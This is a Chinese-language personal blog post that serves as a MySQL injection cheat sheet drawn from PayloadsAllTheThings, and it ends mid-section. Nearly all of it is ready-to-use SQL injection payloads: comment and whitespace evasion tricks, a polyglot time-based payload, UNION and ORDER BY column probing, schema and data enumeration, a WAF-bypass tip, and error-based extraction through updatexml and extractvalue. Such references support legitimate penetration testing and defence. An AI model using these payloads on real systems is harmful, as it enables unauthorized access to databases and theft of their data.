<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="MySQL injection这是如何确认和执行 MySQL 注入的基本流程。欲了解更多信息，请访问: https:&#x2F;&#x2F;github.com&#x2F;carlospolop-forks&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;SQL%20injection&#x2F;MySQL%20Injection.md 注释符123456-- MYSQL Comment# MYSQL Comment&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="MySQL 注入备忘录">
<meta property="og:url" content="http://example.com/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/index.html">
<meta property="og:site_name" content="sing&#39;s Blog">
<meta property="og:description" content="MySQL injection这是如何确认和执行 MySQL 注入的基本流程。欲了解更多信息，请访问: https:&#x2F;&#x2F;github.com&#x2F;carlospolop-forks&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;SQL%20injection&#x2F;MySQL%20Injection.md 注释符123456-- MYSQL Comment# MYSQL Comment&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(154).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/image%20(155).png">
<meta property="og:image" content="http://example.com/.gitbook/assets/c9b31b5011e96ee6bdd2c5bd10e08dc3258e535f34655ed4e4ab54cdfd646253.png">
<meta property="article:published_time" content="2022-04-17T10:27:36.000Z">
<meta property="article:modified_time" content="2022-04-17T15:34:43.024Z">
<meta property="article:author" content="sing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/.gitbook/assets/image%20(154).png">

<link rel="canonical" href="http://example.com/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>MySQL 注入备忘录 | sing's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">sing's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-首页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/17/MySQL-%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          MySQL 注入备忘录
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-17 18:27:36 / Modified: 23:34:43" itemprop="dateCreated datePublished" datetime="2022-04-17T18:27:36+08:00">2022-04-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="MySQL-injection"><a href="#MySQL-injection" class="headerlink" title="MySQL injection"></a>MySQL injection</h1><p><strong>这是如何确认和执行 MySQL 注入的基本流程。欲了解更多信息，请访问:</strong> <a target="_blank" rel="noopener" href="https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md"><strong>https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md</strong></a></p>
<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MYSQL Comment</span></span><br><span class="line"># MYSQL Comment</span><br><span class="line"><span class="comment">/* MYSQL Comment */</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!32302 10*/</span> Comment <span class="keyword">for</span> MySQL version <span class="number">3.23</span><span class="number">.02</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> 向低版本兼容执行。<span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ，执行<span class="keyword">SQL</span>语句 。<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> 作为注释符使用。</span><br></pre></td></tr></table></figure>

<h2 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<h2 id="MySQL-注入常用函数汇总"><a href="#MySQL-注入常用函数汇总" class="headerlink" title="MySQL 注入常用函数汇总"></a>MySQL 注入常用函数汇总</h2><h3 id="确认数据库类型为-Mysql-的函数"><a href="#确认数据库类型为-Mysql-的函数" class="headerlink" title="确认数据库类型为 Mysql 的函数"></a>确认数据库类型为 Mysql 的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">concat(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">system_user</span>()</span><br><span class="line">@<span class="variable">@version</span></span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line">rand()</span><br><span class="line"><span class="built_in">floor</span>(<span class="number">2.9</span>)</span><br><span class="line">length(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">count</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="MySQL-注入使用-函数"><a href="#MySQL-注入使用-函数" class="headerlink" title="MySQL 注入使用 函数"></a>MySQL 注入使用 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> hex(database())</span><br><span class="line"><span class="keyword">SELECT</span> conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>) # <span class="number">16</span> 进制 <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">10</span> 进制</span><br><span class="line"><span class="keyword">SELECT</span> DECODE(ENCODE(<span class="string">&#x27;cleartext&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>), <span class="string">&#x27;PWD&#x27;</span>) # Encode() <span class="operator">&amp;</span> decpde() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> uncompress(compress(database())) # Compress <span class="operator">&amp;</span> uncompress() <span class="keyword">returns</span> <span class="keyword">only</span> numbers</span><br><span class="line"><span class="keyword">SELECT</span> replace(database(),&quot;r&quot;,&quot;R&quot;)</span><br><span class="line"><span class="keyword">SELECT</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x72</span></span><br><span class="line"><span class="keyword">SELECT</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span></span><br><span class="line"><span class="keyword">SELECT</span> database()<span class="operator">=</span><span class="type">char</span>(<span class="number">114</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">114</span>)</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="operator">&lt;</span><span class="keyword">COLUMN</span><span class="operator">&gt;</span>) <span class="keyword">FROM</span> <span class="operator">&lt;</span><span class="keyword">TABLE</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SELECT</span> group_concat(if(strcmp(table_schema,database()),table_name,<span class="keyword">null</span>))</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(<span class="keyword">CASE</span>(table_schema)<span class="keyword">When</span>(database())<span class="keyword">Then</span>(table_name)<span class="keyword">END</span>)</span><br><span class="line"></span><br><span class="line">group_concat() <span class="operator">=</span> <span class="number">1024</span> symbols</span><br><span class="line"><span class="built_in">json_arrayagg</span>() <span class="operator">&gt;</span> <span class="number">16</span>,<span class="number">000</span>,<span class="number">000</span> symbols</span><br><span class="line"></span><br><span class="line"># 盲注相关函数</span><br><span class="line"></span><br><span class="line">## 字符串比较、截取</span><br><span class="line">strcmp()</span><br><span class="line">mid()</span><br><span class="line">ldap()</span><br><span class="line">rdap()</span><br><span class="line"><span class="keyword">left</span>()</span><br><span class="line">rigth()</span><br><span class="line">instr()</span><br><span class="line">make_set()</span><br><span class="line"></span><br><span class="line">## 表达式比较 </span><br><span class="line">if(<span class="built_in">abs</span>(strcmp((ascii(mid(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">2</span>)))),<span class="number">114</span>))<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">find_in_set()</span><br><span class="line">regexp</span><br><span class="line">least(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">115</span>)、greatest(ord(<span class="string">&#x27;r&#x27;</span>),<span class="number">113</span>)</span><br><span class="line"><span class="keyword">between</span> n <span class="keyword">and</span> m</span><br><span class="line"></span><br><span class="line">## 时间相关函数</span><br><span class="line">sleep()</span><br><span class="line">BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>

<h2 id="全适用-Payload"><a href="#全适用-Payload" class="headerlink" title="全适用 Payload"></a>全适用 Payload</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> some_table <span class="keyword">WHERE</span> double_quotes <span class="operator">=</span> &quot;IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*&#x27;XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR&#x27;|&quot;XOR(IF(SUBSTR(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">5</span>,BENCHMARK(<span class="number">2000000</span>,SHA1(<span class="number">0xDE7EC71F1</span>)),SLEEP(<span class="number">1</span>)))<span class="keyword">OR</span>&quot;*/&quot;</span><br></pre></td></tr></table></figure>

<p>from <a target="_blank" rel="noopener" href="https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/">https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/</a></p>
<h2 id="Mysql-注入流程"><a href="#Mysql-注入流程" class="headerlink" title="Mysql 注入流程"></a>Mysql 注入流程</h2><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute “<em><strong>information_schema.tables</strong></em>“ for “<em><strong>mysql.innodb_table_stats</strong></em><strong>“</strong> (This could be useful to bypass WAFs).</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database();#<span class="keyword">Get</span> name <span class="keyword">of</span> the tables</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span>&quot;&lt;TABLE_NAME&gt;&quot;; #<span class="keyword">Get</span> name <span class="keyword">of</span> the columns <span class="keyword">of</span> the <span class="keyword">table</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">&lt;</span>COLUMN1<span class="operator">&gt;</span>,<span class="operator">&lt;</span>COLUMN2<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>TABLE_NAME<span class="operator">&gt;</span>; #<span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> file_priv<span class="operator">=</span><span class="string">&#x27;Y&#x27;</span>; #Users <span class="keyword">with</span> file privileges</span><br></pre></td></tr></table></figure>

<h3 id="Only-1-value"><a href="#Only-1-value" class="headerlink" title="Only 1 value"></a><strong>Only 1 value</strong></h3><ul>
<li><code>group_concat()</code></li>
<li><code>Limit X,1</code></li>
</ul>
<h3 id="Blind-one-by-one"><a href="#Blind-one-by-one" class="headerlink" title="Blind one by one"></a><strong>Blind one by one</strong></h3><ul>
<li><code>substr(version(),X,1)=&#39;r&#39;</code> or <code>substring(version(),X,1)=0x70</code> or <code>ascii(substr(version(),X,1))=112</code></li>
<li><code>mid(version(),X,1)=&#39;5&#39;</code></li>
</ul>
<h3 id="Blind-adding"><a href="#Blind-adding" class="headerlink" title="Blind adding"></a><strong>Blind adding</strong></h3><ul>
<li><code>LPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>RPAD(version(),1...lenght(version()),&#39;1&#39;)=&#39;asd&#39;...</code></li>
<li><code>SELECT RIGHT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT LEFT(version(),1...lenght(version()))=&#39;asd&#39;...</code></li>
<li><code>SELECT INSTR(&#39;foobarbar&#39;, &#39;fo...&#39;)=1</code></li>
</ul>
<h2 id="Detect-number-of-columns-amp-x20"><a href="#Detect-number-of-columns-amp-x20" class="headerlink" title="Detect number of columns&amp;#x20;"></a>Detect number of columns&amp;#x20;</h2><p>Using a simple ORDER</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">order by 1</span><br><span class="line">order by 2</span><br><span class="line">order by 3</span><br><span class="line">...</span><br><span class="line">order by XXX</span><br><span class="line"></span><br><span class="line">UniOn SeLect 1</span><br><span class="line">UniOn SeLect 1,2</span><br><span class="line">UniOn SeLect 1,2,3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-Union-Based"><a href="#MySQL-Union-Based" class="headerlink" title="MySQL Union Based"></a>MySQL Union Based</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,schema_name,<span class="number">0x7c</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.schemata</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_schema<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,column_name,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">wHeRe</span><span class="operator">+</span>table_name<span class="operator">=</span>...</span><br><span class="line"><span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,...,gRoUp_cOncaT(<span class="number">0x7c</span>,data,<span class="number">0x7C</span>)<span class="operator">+</span><span class="keyword">fRoM</span><span class="operator">+</span>...</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Error-Based"><a href="#MYSQL-Error-Based" class="headerlink" title="MYSQL Error Based"></a>MYSQL Error Based</h2><h3 id="MYSQL-Error-Based-Basic"><a href="#MYSQL-Error-Based-Basic" class="headerlink" title="MYSQL Error Based - Basic"></a>MYSQL Error Based - Basic</h3><p><strong>Works with MySQL &gt;&#x3D; 4.1</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="string">&#x27;+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Error-Based-UpdateXML-function"><a href="#MYSQL-Error-Based-UpdateXML-function" class="headerlink" title="MYSQL Error Based - UpdateXML function"></a>MYSQL Error Based - UpdateXML function</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)),<span class="keyword">null</span>)<span class="operator">-</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">AND</span> updatexml(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>Shorter to read:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(null,concat(0x0a,version()),null)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="keyword">null</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>)),<span class="keyword">null</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-Extractvalue-function"><a href="#MYSQL-Error-Based-Extractvalue-function" class="headerlink" title="MYSQL Error Based - Extractvalue function"></a>MYSQL Error Based - Extractvalue function</h3><p><strong>Works with MySQL &gt;&#x3D; 5.1</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="type">CHAR</span>(<span class="number">126</span>),version(),<span class="type">CHAR</span>(<span class="number">126</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),schema_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.schemata LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),TABLE_NAME,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),column_name,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span>data_table LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(<span class="keyword">SELECT</span> concat(<span class="type">CHAR</span>(<span class="number">126</span>),data_info,<span class="type">CHAR</span>(<span class="number">126</span>)) <span class="keyword">FROM</span> data_table.data_column LIMIT data_offset,<span class="number">1</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="MYSQL-Error-Based-NAME-CONST-function-only-for-constants"><a href="#MYSQL-Error-Based-NAME-CONST-function-only-for-constants" class="headerlink" title="MYSQL Error Based - NAME_CONST function (only for constants)"></a>MYSQL Error Based - NAME_CONST function (only for constants)</h3><p><strong>Works with MySQL &gt;&#x3D; 5.0</strong></p>
